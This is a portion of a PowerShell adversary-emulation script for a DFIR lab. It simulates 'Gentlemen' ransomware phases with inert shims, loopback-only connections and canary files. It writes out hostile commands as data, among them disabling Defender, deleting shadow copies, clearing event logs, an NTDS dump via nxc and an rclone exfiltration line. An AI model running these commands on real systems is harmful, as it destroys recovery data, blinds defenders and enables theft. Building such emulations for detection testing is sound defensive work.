            Stop-Process -Id $notepad.Id -Force -ErrorAction SilentlyContinue
        }
    }

    @(
        'BLOCKED ACTIONS'
        'LSASS dump: not performed'
        'NTDS.dit/SYSTEM hive dump: not performed'
        'Password reset: not performed'
        'Credential replay: not performed'
    ) | Set-Content -LiteralPath (Join-Path $credentialRoot 'BLOCKED.txt') -Encoding UTF8

    Write-LabEvent -PhaseName $phaseName -ActionName 'Real credential access withheld' `
        -Techniques @('T1003.001', 'T1003.003', 'T1098') -Disposition Blocked `
        -Details 'Only a sacrificial Notepad process may be dumped; LSASS/NTDS and account changes are never touched.'
    Start-Sleep -Seconds $StepDelaySeconds
}

function Invoke-LateralMovementPhase {
    $phaseName = 'LateralMovement'
    Write-Host "`n=== RDP, SMB, WinRM, NetExec, and GoTo Resolve ==="

    $lateralRoot = Join-Path $script:RunRoot 'LateralMovement'
    New-Item -Path $lateralRoot -ItemType Directory -Force | Out-Null

    $nxcPath = New-RenamedCmdShim -Directory $lateralRoot -Name 'nxc.exe'
    Invoke-LabCmd -PhaseName $phaseName -Launcher $nxcPath `
        -Command 'echo nxc smb 192.0.2.10 -u DFIRLAB\svc_backup -p REDACTED --no-bruteforce --continue-on-success' `
        -Techniques @('T1021.002', 'T1036') `
        -Description 'Documentation-prefix IP 192.0.2.10 appears only inside echo; no socket is opened.' | Out-Null
    Invoke-LabCmd -PhaseName $phaseName -Launcher $nxcPath `
        -Command 'echo nxc smb 192.0.2.10 -u DFIRLAB\svc_backup -p REDACTED --ntds BLOCKED' `
        -Techniques @('T1003.003', 'T1021.002') `
        -Description 'NTDS action is a printed simulation marker only.' | Out-Null

    @(
        'full address:s:192.0.2.10'
        'username:s:DFIRLAB\svc_backup'
        'prompt for credentials:i:1'
        'authentication level:i:2'
    ) | Set-Content -LiteralPath (Join-Path $lateralRoot 'server-admin.rdp') -Encoding ASCII

    @(
        'DFIR LAB SYNTHETIC LATERAL MOVEMENT LOG'
        'RDP 192.0.2.10 - artifact only; mstsc not launched'
        'SMB 192.0.2.10 - artifact only; no connection'
        'WinRM 192.0.2.10 - artifact only; no connection'
        'Credential=REDACTED-NOT-PRESENT'
    ) | Set-Content -LiteralPath (Join-Path $lateralRoot 'lateral-movement-plan.txt') -Encoding UTF8

    $smokymo = Join-Path $lateralRoot 'smokymo.msi'
    'DFIR LAB PLACEHOLDER - NOT A GOTO RESOLVE INSTALLER' | Set-Content -LiteralPath $smokymo -Encoding UTF8
    Invoke-LabProcess -PhaseName $phaseName -FilePath 'msiexec.exe' `
        -ArgumentList @('/i', $smokymo, '/qn', '/norestart') `
        -Techniques @('T1219', 'T1218.007') `
        -Description 'Invalid placeholder MSI fails closed and installs no software.' | Out-Null

    Start-LoopbackIocAttempt -PhaseName $phaseName -HostName 'gotoresolve.com' `
        -Techniques @('T1219', 'T1102.002')

    if ($EnableServiceArtifact) {
        if (-not (Test-IsAdministrator)) {
            Write-LabEvent -PhaseName $phaseName -ActionName 'Inert GoTo Resolve service not created' `
                -Techniques @('T1543.003', 'T1219') -Disposition Skipped `
                -Details '-EnableServiceArtifact requires an elevated PowerShell session.'
        }
        else {
            try {
                $serviceName = "GoToResolve_DFIRLAB_$($script:RunId)"
                $serviceDir = Join-Path $lateralRoot 'GoTo Resolve Unattended\DFIRLAB'
                $checkerPath = New-RenamedCmdShim -Directory $serviceDir -Name 'GoToResolveProcessChecker.exe'
                $binaryPath = '"{0}" /d /c "exit 0"' -f $checkerPath
                New-Service -Name $serviceName -BinaryPathName $binaryPath -StartupType Disabled `
                    -Description "DFIR LAB inert GoTo Resolve artifact $($script:RunId)" | Out-Null
                $script:State.Services += $serviceName
                Save-LabState

                Write-LabEvent -PhaseName $phaseName -ActionName 'Disabled inert RMM service created' `
                    -Techniques @('T1543.003', 'T1219') -Artifact $serviceName `
                    -Disposition ExecutedSafe -Details 'Service points to renamed cmd.exe, is disabled, and is never started.'
            }
            catch {
                Write-LabEvent -PhaseName $phaseName -ActionName 'Inert GoTo Resolve service unavailable' `
                    -Techniques @('T1543.003', 'T1219') -Disposition Skipped `
                    -Details $_.Exception.Message
            }
        }
    }
    else {
        Write-LabEvent -PhaseName $phaseName -ActionName 'RMM service represented by artifacts only' `
            -Techniques @('T1543.003', 'T1219') -Artifact $smokymo `
            -Disposition SyntheticOnly -Details 'Use -EnableServiceArtifact in an elevated lab session for service-install telemetry.'
    }

    Write-LabEvent -PhaseName $phaseName -ActionName 'Remote lateral movement withheld' `
        -Techniques @('T1021.001', 'T1021.002', 'T1021.006') -Disposition Blocked `
        -Details 'RDP, SMB, and WinRM targets exist only as synthetic artifacts using RFC 5737 documentation addresses.'
    Start-Sleep -Seconds $StepDelaySeconds
}

function Invoke-CollectionAndExfiltrationPhase {
    $phaseName = 'CollectionAndExfiltration'
    Write-Host "`n=== Rclone staging and Wasabi exfiltration ==="

    $exfilRoot = Join-Path $script:RunRoot 'Exfiltration'
    $stagingRoot = Join-Path $exfilRoot 'WasabiStaging'
    New-Item -Path $stagingRoot -ItemType Directory -Force | Out-Null

    $rclonePath = New-RenamedCmdShim -Directory (Join-Path $exfilRoot 'rclone-v1.73.5-windows-amd64') -Name 'rclone.exe'
    @(
        '[wasabi]'
        'type = s3'
        'provider = Wasabi'
        'access_key_id = DFIRLAB-NOT-A-CREDENTIAL'
        'secret_access_key = DFIRLAB-NOT-A-CREDENTIAL'
        'endpoint = http://127.0.0.1'
    ) | Set-Content -LiteralPath (Join-Path $exfilRoot 'rclone.conf') -Encoding UTF8

    $source = Join-Path $script:RunRoot 'CanaryData'
    $command = 'echo rclone.exe copy "{0}" wasabi:"/dfir-lab/{2}" --max-age 90d --exclude "AppData/**" --transfers=8 --checkers=32 --fast-list --ignore-existing --stats=10s --bwlimit=off & robocopy.exe "{0}" "{1}" /E /R:0 /W:0' -f $source, $stagingRoot, $script:RunId
    Invoke-LabCmd -PhaseName $phaseName -Launcher $rclonePath -Command $command `
        -Techniques @('T1560.001', 'T1567.002', 'T1036') `
        -Description 'Renamed cmd.exe copies only synthetic canaries locally with robocopy; Wasabi URI is echoed.' | Out-Null

    if (-not (Get-ChildItem -LiteralPath $stagingRoot -Force -ErrorAction SilentlyContinue)) {
        Copy-Item -Path (Join-Path $source '*') -Destination $stagingRoot -Recurse -Force
        Write-LabEvent -PhaseName $phaseName -ActionName 'Local staging fallback used' `
            -Techniques @('T1074.001') -Artifact $stagingRoot -Disposition ExecutedSafe `
            -Details 'robocopy produced no files; PowerShell copied the synthetic canary corpus locally.'
    }

    $archivePath = Join-Path $exfilRoot 'staged-sensitive-data.zip'
    Compress-Archive -Path (Join-Path $stagingRoot '*') -DestinationPath $archivePath -Force
    Write-LabEvent -PhaseName $phaseName -ActionName 'Synthetic data staged and archived locally' `
        -Techniques @('T1074.001', 'T1560.001') -Artifact $archivePath `
        -Disposition ExecutedSafe -Details 'Archive contains only script-generated canary data.'

    Start-LoopbackIocAttempt -PhaseName $phaseName -HostName 's3.wasabisys.com' `
        -Launcher $rclonePath -Techniques @('T1567.002')
    Write-LabEvent -PhaseName $phaseName -ActionName 'External exfiltration withheld' `
        -Techniques @('T1567.002') -Artifact ("wasabi:/dfir-lab/{0}" -f $script:RunId) -Disposition Blocked `
        -Details 'No cloud credentials exist and the only connection attempt is pinned to 127.0.0.1.'
    Start-Sleep -Seconds $StepDelaySeconds
}

function Invoke-DefenseEvasionPhase {
    $phaseName = 'DefenseEvasion'
    Write-Host "`n=== Defender impairment, VM stop, shadow deletion, and log clearing ==="

    $evasionRoot = Join-Path $script:RunRoot 'DefenseEvasion'
    New-Item -Path $evasionRoot -ItemType Directory -Force | Out-Null

    $blockedCommands = @(
        'Set-MpPreference -DisableRealtimeMonitoring $true',
        'Add-MpPreference -ExclusionPath C:\',
        'Stop-VM -Name * -Force',
        'vssadmin.exe delete shadows /all /quiet',
        'wevtutil.exe cl System',
        'wevtutil.exe cl Security',
        'wevtutil.exe cl Microsoft-Windows-Sysmon/Operational'
    )
    @(
        'DFIR LAB BLOCKED COMMAND CATALOG - THESE COMMANDS WERE NOT EXECUTED'
        $blockedCommands
    ) | Set-Content -LiteralPath (Join-Path $evasionRoot 'blocked-commands.txt') -Encoding UTF8

    $markerPath = Join-Path $evasionRoot 'defender-commandline-marker.txt'
    $safePowerShell = 'Write-Output ''SIMULATION ONLY: Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath C:\'' | Set-Content -LiteralPath ''{0}''' -f $markerPath.Replace("'", "''")
    Invoke-LabProcess -PhaseName $phaseName -FilePath 'powershell.exe' `
        -ArgumentList @('-NoProfile', '-NonInteractive', '-Command', $safePowerShell) `
        -Techniques @('T1562.001') `
        -Description 'Command-line markers are written to a file; Defender cmdlets are never invoked.' | Out-Null

    Invoke-LabProcess -PhaseName $phaseName -FilePath 'vssadmin.exe' `
        -ArgumentList @('list', 'shadows') -Techniques @('T1490') `
        -Description 'Read-only shadow-copy enumeration; no delete verb is used.' | Out-Null
    Invoke-LabProcess -PhaseName $phaseName -FilePath 'wevtutil.exe' `
        -ArgumentList @('gli', 'System') -Techniques @('T1070.001') `
        -Description 'Read-only log information query; no clear-log verb is used.' | Out-Null

    if (Get-Command Get-VM -ErrorAction SilentlyContinue) {
        Invoke-LabProcess -PhaseName $phaseName -FilePath 'powershell.exe' `
            -ArgumentList @('-NoProfile', '-NonInteractive', '-Command', 'Get-VM | Select-Object Name,State') `
            -Techniques @('T1489') -Description 'Read-only VM inventory; no VM is stopped.' | Out-Null
    }

    foreach ($blocked in $blockedCommands) {
        Write-LabEvent -PhaseName $phaseName -ActionName 'Destructive defense-evasion command withheld' `
            -Techniques @('T1562.001', 'T1490', 'T1070.001', 'T1489') `
            -Artifact $blocked -Disposition Blocked -Details 'Recorded as an investigation marker only.'
    }
    Start-Sleep -Seconds $StepDelaySeconds
}

function New-SyntheticWallpaper {
    param([Parameter(Mandatory)][string]$Path)

    try {
        Add-Type -AssemblyName System.Drawing
        $bitmap = [Drawing.Bitmap]::new(1280, 720)
        $graphics = [Drawing.Graphics]::FromImage($bitmap)
        try {
            $graphics.Clear([Drawing.Color]::FromArgb(15, 15, 15))
            $font = [Drawing.Font]::new('Consolas', 28, [Drawing.FontStyle]::Bold)
            $brush = [Drawing.SolidBrush]::new([Drawing.Color]::FromArgb(210, 55, 55))
            try {
                $graphics.DrawString("DFIR LAB`nTHE GENTLEMEN IMPACT SIMULATION`n$($script:RunId)", $font, $brush, 90, 240)
            }
            finally {
                $font.Dispose()
                $brush.Dispose()
            }
            $bitmap.Save($Path, [Drawing.Imaging.ImageFormat]::Bmp)
        }
        finally {
            $graphics.Dispose()
            $bitmap.Dispose()
        }
    }
    catch {
        "DFIR LAB WALLPAPER PLACEHOLDER $($script:RunId)" | Set-Content -LiteralPath $Path -Encoding UTF8
    }
}

function Invoke-ImpactPhase {
    $phaseName = 'Impact'
    Write-Host "`n=== GPO/scheduled-task deployment and Gentlemen ransomware impact ==="

    $impactRoot = Join-Path $script:RunRoot 'Impact'
    $fakeDomain = 'DFIRLAB.LOCAL'
    $gpoGuid = '{' + ([Guid]::NewGuid().ToString().ToUpperInvariant()) + '}'
    $fakeSysvol = Join-Path $impactRoot ("FakeDomain\SYSVOL\{0}\Policies\{1}\Machine\Preferences\ScheduledTasks" -f $fakeDomain, $gpoGuid)
    $fakeNetlogon = Join-Path $impactRoot ("FakeDomain\SYSVOL\{0}\scripts" -f $fakeDomain)
    New-Item -Path $fakeSysvol -ItemType Directory -Force | Out-Null
    New-Item -Path $fakeNetlogon -ItemType Directory -Force | Out-Null

    $gentlemanPath = New-RenamedCmdShim -Directory $fakeNetlogon -Name 'gentleman.exe'
    $taskXml = @"
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
  <TaskV2 name="Gentlemen-$($script:RunId)" image="0" changed="2026-05-11 00:00:00" uid="$gpoGuid">
    <Properties action="U" name="Gentlemen-$($script:RunId)" runAs="SYSTEM" logonType="S4U">
      <Task version="1.3">
        <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
        <Settings><Enabled>false</Enabled><Hidden>true</Hidden></Settings>
        <Actions Context="Author"><Exec><Command>\\$fakeDomain\NETLOGON\gentleman.exe</Command><Arguments>--dfir-lab-inert</Arguments></Exec></Actions>
      </Task>
    </Properties>
  </TaskV2>
</ScheduledTasks>
"@
    Set-Content -LiteralPath (Join-Path $fakeSysvol 'ScheduledTasks.xml') -Value $taskXml -Encoding UTF8

    Invoke-LabCmd -PhaseName $phaseName -Launcher $gentlemanPath `
        -Command ('echo Gentlemen ransomware simulation started for {0} - canary data only' -f $script:RunId) `
        -Techniques @('T1486', 'T1036') `
        -Description 'gentleman.exe is renamed cmd.exe and performs no encryption.' | Out-Null

    $canaryRoot = Join-Path $script:RunRoot 'CanaryData'
    Assert-PathWithin -Path $canaryRoot -Parent $script:RunRoot
    Get-ChildItem -LiteralPath $canaryRoot -File -Recurse | ForEach-Object {
        Rename-Item -LiteralPath $_.FullName -NewName ($_.Name + '.gentlemen')
    }

    Get-ChildItem -LiteralPath $canaryRoot -Directory -Recurse | ForEach-Object {
        @(
            'THE GENTLEMEN - DFIR LAB IMPACT SIMULATION'
            'No data was encrypted. Files were renamed inside a synthetic canary tree.'
            "RunId=$($script:RunId)"
            'Restore copies are in CanaryOriginals.'
        ) | Set-Content -LiteralPath (Join-Path $_.FullName 'README-GENTLEMEN.txt') -Encoding UTF8
    }

    $wallpaperPath = Join-Path $impactRoot 'gentlemen-wallpaper.bmp'
    New-SyntheticWallpaper -Path $wallpaperPath
    @(
        'Windows Registry Editor Version 5.00'
        ''
        '[HKEY_CURRENT_USER\Control Panel\Desktop]'
        ('"WallPaper"="{0}"' -f $wallpaperPath.Replace('\', '\\'))
        ''
        '; SYNTHETIC EXPORT ONLY - THIS FILE WAS NOT IMPORTED'
    ) | Set-Content -LiteralPath (Join-Path $impactRoot 'wallpaper-change-NOT-IMPORTED.reg') -Encoding Unicode

    if ($EnableScheduledTaskArtifact) {
        $taskName = "Gentlemen-$($script:RunId)"
        $taskPath = '\DFIR-Lab\'
        try {
            $taskAction = New-ScheduledTaskAction -Execute $env:ComSpec -Argument '/d /c "exit 0"'
            $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddYears(5)
            Register-ScheduledTask -TaskName $taskName -TaskPath $taskPath `
                -Action $taskAction -Trigger $taskTrigger `
                -Description "DFIR LAB disabled inert Gentlemen artifact $($script:RunId)" | Out-Null
            Disable-ScheduledTask -TaskName $taskName -TaskPath $taskPath | Out-Null
            $script:State.ScheduledTasks += [ordered]@{ TaskName = $taskName; TaskPath = $taskPath }
            Save-LabState

            Write-LabEvent -PhaseName $phaseName -ActionName 'Disabled inert local scheduled task created' `
                -Techniques @('T1053.005') -Artifact "$taskPath$taskName" `
                -Disposition ExecutedSafe -Details 'Task is disabled, scheduled five years ahead, and its action exits immediately.'
        }
        catch {
            Write-LabEvent -PhaseName $phaseName -ActionName 'Local scheduled-task artifact unavailable' `
                -Techniques @('T1053.005') -Disposition Skipped -Details $_.Exception.Message
        }
    }
    else {
        Write-LabEvent -PhaseName $phaseName -ActionName 'Scheduled task represented by fake GPO XML only' `
            -Techniques @('T1053.005', 'T1484.001') -Artifact $fakeSysvol `
            -Disposition SyntheticOnly -Details 'Use -EnableScheduledTaskArtifact for a disabled local task.'
    }

    Write-LabEvent -PhaseName $phaseName -ActionName 'Canary-only ransomware impact completed' `
        -Techniques @('T1486', 'T1484.001', 'T1053.005', 'T1491.001') `
        -Artifact $canaryRoot -Disposition ExecutedSafe `
        -Details 'Files were renamed, not encrypted; originals remain in CanaryOriginals. Real GPO/SYSVOL and the user desktop were untouched.'
    Write-LabEvent -PhaseName $phaseName -ActionName 'Domain-wide ransomware deployment withheld' `
        -Techniques @('T1484.001', 'T1486') -Disposition Blocked `
        -Details 'No GPO, SYSVOL, NETLOGON, remote host, security control, recovery mechanism, or user data was changed.'
    Start-Sleep -Seconds $StepDelaySeconds
}

function Invoke-Cleanup {
    if (-not $ConfirmLab) {
        throw 'Cleanup requires -ConfirmLab and an exact RunId.'
    }
    if ($env:OS -ne 'Windows_NT') {
        throw 'Cleanup must run on the Windows host where the scenario was executed.'
    }
    if ([string]::IsNullOrWhiteSpace($RunId)) {
        throw 'Cleanup requires -RunId.'
    }

    Assert-SafeRunId -Value $RunId
    $targetRoot = Join-Path $script:LabBase $RunId
    Assert-PathWithin -Path $targetRoot -Parent $script:LabBase
    $statePath = Join-Path $targetRoot 'State.json'
    if (-not (Test-Path -LiteralPath $statePath)) {
        throw "State manifest not found. Refusing cleanup: $statePath"
    }

    $state = Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json
    if ($state.RunId -ne $RunId -or $state.Scenario -ne $script:ScenarioName) {
        throw 'State manifest identity mismatch. Refusing cleanup.'
    }

    foreach ($entry in @($state.RegistryValues)) {
        try {
            $current = Get-ItemPropertyValue -Path $entry.Path -Name $entry.Name -ErrorAction Stop
            if ($current -eq $entry.ExpectedData) {
                Remove-ItemProperty -Path $entry.Path -Name $entry.Name -ErrorAction Stop
                Write-Host "Removed registry value $($entry.Path)\$($entry.Name)"
            }
            else {
                Write-Warning "Registry value changed since simulation; leaving it untouched: $($entry.Name)"
            }
        }
        catch {
            Write-Verbose "Registry cleanup skipped: $($_.Exception.Message)"
        }
    }

    foreach ($serviceName in @($state.Services)) {
        $expectedServiceName = "GoToResolve_DFIRLAB_$RunId"
        if ([string]$serviceName -ne $expectedServiceName) {
            throw "Unexpected service name in manifest: $serviceName"
        }
        if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
            & sc.exe delete $serviceName | Out-Null
            Write-Host "Requested deletion of service $serviceName"
        }
    }

    foreach ($task in @($state.ScheduledTasks)) {
        $expectedTaskName = "Gentlemen-$RunId"
        if ($task.TaskPath -ne '\DFIR-Lab\' -or [string]$task.TaskName -ne $expectedTaskName) {
            throw "Unexpected scheduled-task identity in manifest: $($task.TaskPath)$($task.TaskName)"
        }
        Unregister-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath `
            -Confirm:$false -ErrorAction SilentlyContinue
        Write-Host "Removed scheduled task $($task.TaskPath)$($task.TaskName)"
    }

    $expectedExternalPaths = @(
        (Join-Path (Join-Path $env:USERPROFILE 'Downloads') 'RAMMap.msi'),
        (Join-Path (Join-Path $env:USERPROFILE 'Downloads') ("RAMMap-{0}.msi" -f $RunId)),
        (Join-Path $env:LOCALAPPDATA ("P2RsupmqXnmx-{0}" -f $RunId)),
        (Join-Path $env:TEMP ("9gY0LJMyXW-{0}.zip" -f $RunId)),
        (Join-Path $env:TEMP ("netscan-{0}.exe" -f $RunId))
    ) | ForEach-Object { [IO.Path]::GetFullPath($_) }

    $createdPaths = @($state.CreatedPaths) | Sort-Object { ([string]$_).Length } -Descending
    foreach ($createdPath in $createdPaths) {
        if ([string]::IsNullOrWhiteSpace([string]$createdPath)) {
            continue
        }

        $isRunTree = [IO.Path]::GetFullPath([string]$createdPath).StartsWith(
            [IO.Path]::GetFullPath($targetRoot),
            [StringComparison]::OrdinalIgnoreCase
        )
        $createdFullPath = [IO.Path]::GetFullPath([string]$createdPath)
        $isKnownExternal = $false
        foreach ($expectedExternalPath in $expectedExternalPaths) {
            if ($createdFullPath.Equals($expectedExternalPath, [StringComparison]::OrdinalIgnoreCase)) {
                $isKnownExternal = $true
                break
            }
        }

        if (-not $isRunTree -and -not $isKnownExternal) {
            throw "Unexpected cleanup path in manifest; refusing to remove: $createdPath"
        }

        if (Test-Path -LiteralPath $createdPath) {
            if ($createdFullPath -like '*\Downloads\RAMMap*.msi' -or $createdFullPath -like '*\9gY0LJMyXW-*.zip') {
                $marker = Get-Content -LiteralPath $createdPath -Raw -ErrorAction Stop
                if ($marker -notlike "*RunId=$RunId*") {
                    throw "External artifact marker mismatch; refusing to remove: $createdPath"
                }
            }
            Remove-Item -LiteralPath $createdPath -Recurse -Force
            Write-Host "Removed $createdPath"
        }
    }

    Write-Host "Cleanup complete for $RunId. Event/EDR telemetry remains available for investigation."
}

if ($Action -eq 'Cleanup') {
    Invoke-Cleanup
    return
}

Initialize-Simulation
New-CanaryCorpus

$phaseFunctions = [ordered]@{
    InitialAccess              = 'Invoke-InitialAccessPhase'
    PersistenceAndC2           = 'Invoke-PersistenceAndC2Phase'
    Discovery                  = 'Invoke-DiscoveryPhase'
    TukTuk                     = 'Invoke-TukTukPhase'
    CredentialAccess           = 'Invoke-CredentialAccessPhase'
    LateralMovement            = 'Invoke-LateralMovementPhase'
    CollectionAndExfiltration  = 'Invoke-CollectionAndExfiltrationPhase'
    DefenseEvasion             = 'Invoke-DefenseEvasionPhase'
    Impact                     = 'Invoke-ImpactPhase'
}

foreach ($entry in $phaseFunctions.GetEnumerator()) {
    if (Test-SelectedPhase -Name $entry.Key) {
        & $entry.Value
    }
}

Save-LabState
Write-LabEvent -PhaseName 'Complete' -ActionName 'Scenario complete; artifacts intentionally retained' `
    -Disposition Information -Artifact $script:RunRoot `
    -Details 'Investigate Timeline.jsonl, ProcessLogs, endpoint telemetry, and created artifacts before cleanup.'

Write-Host "`nSimulation complete."
Write-Host "RunId: $($script:RunId)"
Write-Host "Artifacts: $($script:RunRoot)"
Write-Host "Cleanup: .\Invoke-GentlemenEmulation.ps1 -Action Cleanup -ConfirmLab -RunId $($script:RunId)"
